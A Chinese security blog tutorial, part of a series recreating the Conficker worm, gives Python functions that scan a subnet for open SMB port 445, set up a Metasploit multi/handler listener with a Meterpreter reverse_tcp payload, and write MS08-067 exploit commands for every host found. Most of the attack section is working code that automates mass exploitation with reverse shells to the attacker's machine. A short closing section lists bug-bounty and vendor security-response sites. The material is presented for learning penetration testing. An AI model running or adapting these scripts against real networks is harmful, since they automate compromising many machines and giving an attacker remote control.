# 原创
：  【Python脚本进阶】2.4、conficker蠕虫（中）:Python脚本与Metasploit交互

# 【Python脚本进阶】2.4、conficker蠕虫（中）:Python脚本与Metasploit交互

 <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）Python脚本与Metasploit交互（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

> 
<h2> <img alt="" height="23" src="https://img-blog.csdnimg.cn/19e90c25b42d4b368c3c94da4b04afb0.png" width="23"/>让读者如虎添翼</h2>
<table border="1" cellpadding="1" cellspacing="1"><tbody>|conficker蠕虫博文|目标|状态
|[【Python脚本进阶】conficker蠕虫（上）:Metasploit攻击Windows SMB服务](https://blog.csdn.net/qq_53079406/article/details/126077115)|Metasploit攻击|已发布
|[【Python脚本进阶】conficker蠕虫（中）:Python脚本与Metasploit交互](https://blog.csdn.net/qq_53079406/article/details/126081487)|Python脚本与Metasploit交互|已发布
|[【Python脚本进阶】conficker蠕虫（下）:暴破口令，远程执行进程](https://blog.csdn.net/qq_53079406/article/details/126084405)|暴破口令，远程执行进程|已发布
|[【Python脚本进阶】conficker蠕虫（终）](https://blog.csdn.net/qq_53079406/article/details/126084602)|完整代码|已发布
</tbody></table>



---


**目录**

[一、简介](#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B)

[1.1、分析：](#1.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

[二、实现](#%E4%BA%8C%E3%80%81%E5%AE%9E%E7%8E%B0)

[2.1、扫描：](#2.1%E3%80%81%E6%89%AB%E6%8F%8F%EF%BC%9A)

[2.2、通信：](#2.2%E3%80%81%E9%80%9A%E4%BF%A1%EF%BC%9A)

[2.3、利用：](#2.3%E3%80%81%E5%88%A9%E7%94%A8%EF%BC%9A)

---


## 一、简介

> 
<h3>1.1、分析：</h3>
已经编写了一个Metasploit 脚本， 用它黑掉了一台机器， 并获得一个shell。但是在254台主机上重复这一过程可能会使我们在键入配置文件上花太多的时间， 再次使用Python， 就可以快速编写一个能扫描出所有打开445 端口的主机，并自动生成一个去攻击所有有漏洞主机的Metasploit脚本文件的Python脚本。


---


---


## 二、实现

> 
<h3>2.1、扫描：</h3>
与上一个端口扫描器例子中的Nmap-Python模块类似。
findTgts(）函数输入的参数是一个要扫描的主机IP地址（段）， 返回所有开放TCP 445端口的主机。TCP 445端口主要是作为SMB协议的默认端口用的。通过过滤， 只留下开放TCP 445端口的主机，攻击脚本的目标就只有这些攻击能够起效的主机了。这一过滤操作同时也会把那些通常会阻塞我们的连接企图的主机也消除掉。函数会逐一扫描所有的主机， 一旦发现某台机主打开了TCP (445)端口， 就会把该主机添加到一个数组中。完成扫描循环后，该函数会返回到这个含有所有打开了TCP 445端口的主机的数组。

<pre><code>import nmap


def findTgts(subNet):
    nmScan = nmap.PortScanner()
    nmScan.scan(subNet, '445')
    tgtHosts = []
    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(445):
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print('[+] Found Target Host：' + host)
                tgtHosts.append(host)
    return tgtHosts</code></pre>


> 
<h3>2.2、通信：</h3>
要为被我们黑掉的目标编写一个监听器
监听器或称命令与控制信道，使我们能在它被我们黑掉之后与目标主机进行远程交互。Metasploit提供了一个被称为Meterpreter的高级的动态负载。Metasploit的Meterpreter在远程机器上运行后， 会主动连接我们的指挥控制主机， 并提供大量分析和控制肉机的函数。Meterpreter扩展工具包中还提供寻找取证对象、发布命令、通过肉机路由流量、安装键盘记录器或转储密码hash的能力。
<hr/>
当Meterpreter进程回连接到攻击者的计算机等候执行进一步的命令时， 我们要使用一个名为multi/handler的Metasploit模块去发布命令。在我们的机器上设置multi/handler监听器时， 首先需要把各条指令写入Metasploit的re 脚本中。请留意上面是用什么命令把载荷(PAYLOAD)设置为reverse_ tcp连接的， 然后又是用什么命令设置本地主机IP地址和希望收到反向连接的端口的。此外， 我们还增设了一个全局变量DisablePayloadHandler, 作用是： 已经新建了一个监听器， 此后所有的主机均不必重复新建监听器。

<pre><code>def setupHandler(configFile, lhost, lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('setPAYLOAD ' + 'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')</code></pre>



> 
<h3>2.3、利用：</h3>
当脚本能够在目标主机上执行漏洞利用代码时， 该函数将向Metasploit re脚本中写入用于生成漏洞利用代码的目标主机、本地地址和端口。该函数还将把指定使用哪个漏洞利用代码的指令也写入re脚本的文件中
<hr/>
先去指定使用ms08_ 067 netapi这个漏洞利用代码——这也是Conficker蠕虫攻击时使用的漏洞利用代码， 同时还需要设定攻击的目标——RHOST。还要设定Meterpreter的载荷以及Meterpreter所需的本机地址(LHOST)和端口(L PORT)
<hr/>
脚本发送了一条指令在同一个任务(job)的上下文环境中(-j),不与任务进行即时交互的条件下(-z) 利用对目标计算机上的漏洞。因为这个脚本会黑掉多台目标计算机， 根本不可能同时与这些被黑的计算机交互， 所以脚本中必须使用-j和-z参数。

<pre><code>def confickerExploit(configFile, tgtHost, lhost, lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi \n')
    configFile.write('set RHOST ' +str(tgtHost) +'\n')
    configFile.write('set PAYLOAD '+ 'windows/meterpreter/reverse_tcp\n')
    configFile. write ('set LPORT ' +str(lport） + '\n')
    configFile. write ('set LHOST ' +lhost +'\n')
    configFile. write ('exploit -j -z\n')</code></pre>


---


---


---


> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cnhttps://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[https://ce.kanxue.com/](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="23"/>Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year 

---


​​​​​​​
